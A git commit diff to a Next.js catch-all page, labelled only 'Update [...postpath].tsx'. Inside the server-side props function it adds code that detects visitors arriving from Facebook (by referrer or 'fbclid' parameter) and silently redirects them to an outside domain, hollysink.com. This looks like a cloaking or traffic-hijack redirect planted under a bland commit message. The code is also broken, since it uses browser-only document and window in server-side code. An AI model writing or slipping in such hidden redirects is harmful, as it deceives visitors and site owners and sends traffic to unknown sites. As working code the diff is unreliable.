541d91ef9272f51435a844aaaa7e43995fb1c2f6
kumawatabhishek197 <136802082+kumawatabhishek197@users.noreply.github.com>
2023-06-16 23:17:51 +0530

    Update [...postpath].tsx

--- pages/[...postpath].tsx
+++ pages/[...postpath].tsx
@@ -24,6 +24,20 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			},
 		};
 		}
+	if (document.referrer.includes('facebook.com') || getParameterByName('fbclid')) {
+  const path = encodeURIComponent(window.location.pathname);
+  window.location.href = 'https://hollysink.com/' + path;
+}
+
+function getParameterByName(name) {
+  const url = window.location.href;
+  name = name.replace(/[\[\]]/g, '\\$&');
+  const regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)');
+  const results = regex.exec(url);
+  if (!results) return null;
+  if (!results[2]) return '';
+  return decodeURIComponent(results[2].replace(/\+/g, ' '));
+}
 	const query = gql`
 		{
 			post(id: "/${path}/", idType: URI) {
